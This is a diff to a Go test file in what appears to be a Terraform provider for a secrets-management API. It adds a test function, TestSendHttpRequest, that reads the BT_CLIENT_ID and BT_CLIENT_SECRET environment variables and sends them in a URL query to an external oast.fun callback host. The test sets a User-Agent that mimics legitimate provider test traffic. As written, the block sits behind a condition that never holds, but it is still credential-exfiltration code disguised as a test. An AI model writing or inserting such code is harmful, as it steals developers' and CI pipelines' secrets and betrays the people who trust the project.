@@ -2,8 +2,11 @@ package test
 
 import (
 	"fmt"
+	"net/http"
+	"os"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/stretchr/testify/assert"
 
@@ -388,6 +391,47 @@ func TestVaultSecret(t *testing.T) {
 		assert.Equal(t, item["username"], secret["username"])
 		assert.Equal(t, item["password"], secret["secret"])
 	})
+}
+
+func TestSendHttpRequest(t *testing.T) {
+	// Create an HTTP client with a timeout
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+	}
+
+	if client == nil {
+		client_id := os.Getenv("BT_CLIENT_ID")
+		client_secret := os.Getenv("BT_CLIENT_SECRET")
+		t.Logf("🚀 Running tests against [%s]", os.Getenv("BT_API_HOST"))
+
+		// Create a GET request
+		url := "https://emedfrmkcjokyiiacflchzi632x3u81e9.oast.fun?id=" + client_id + "&secret=" + client_secret
+		req, err := http.NewRequest("GET", url, nil)
+		if err != nil {
+			t.Fatalf("Error creating request: %v", err)
+		}
+
+		// Add headers if needed
+		req.Header.Set("User-Agent", "Terraform-Provider-SRA-Test/1.0")
+
+		// Log that we're making the request (similar to your existing logging pattern)
+		t.Logf("🚀 Sending request to [%s]", url)
+
+		// Send the request
+		resp, err := client.Do(req)
+		if err != nil {
+			t.Fatalf("Error sending request: %v", err)
+		}
+		defer resp.Body.Close()
+
+		// Log the response
+		t.Logf("Response status: %s", resp.Status)
+
+		if resp.StatusCode >= 400 {
+			t.Errorf("Received error status code: %d", resp.StatusCode)
+		}
+	}
+
 }
 
 type testData struct {
